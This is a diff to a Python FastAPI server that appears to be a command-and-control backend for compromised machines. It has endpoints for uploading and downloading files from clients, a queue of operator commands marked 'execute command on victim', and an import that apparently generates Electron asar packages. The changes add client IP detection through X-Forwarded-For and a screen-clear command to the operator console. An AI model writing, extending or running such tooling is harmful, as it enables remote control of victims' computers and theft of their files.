@@ -2,9 +2,9 @@ from typing import *
 from fastapi import FastAPI, Request
 from fastapi.responses import PlainTextResponse
 import base64
-import json
+#import json
 import os
-import sys
+#import sys
 import threading
 import uvicorn
 from asargen import createAsarFile
@@ -77,6 +77,14 @@ def checkIfNewClient(client):
         global global_connection
         global_connection = True
 
+def getIP(request: Request) -> str:
+    forwarded = request.headers.get('X-Forwarded-For')
+    if forwarded:
+        client_ip = forwarded.split(',')[0].strip()
+    else:
+        client_ip = request.client.host
+    return client_ip
+
 @app.get("/upload.php/{file:path}", response_class=PlainTextResponse)
 async def upload_file(file: str, request: Request):
     print("get upload")
@@ -92,7 +100,7 @@ async def download_file(file: str, request: Request):
 @app.get("/{path:path}", response_class=PlainTextResponse)
 async def get_command(path: str, request: Request):
 
-    client = request.client.host
+    client = getIP(request)
     checkIfNewClient(client)
 
     if path in cmdRequests: 
@@ -120,6 +128,9 @@ def decodeFile(filePath, content):
     decoded = base64.b64decode(content)
     with open(filePath, 'wb') as file:
         file.write(decoded)
+
+def clearScreen():
+    print("\n"*1000)
  
 def printHeader():
     print(f"""{bcolors.FAIL} 
@@ -235,6 +246,8 @@ def input_thread():
         #banner
         elif new_cmd == "banner":
             printHeader()
+        elif new_cmd == "clear":
+            clearScreen()
         #execute command on victim
         elif new_cmd.strip() != "":
             CMD_QUEUE.append(new_cmd)
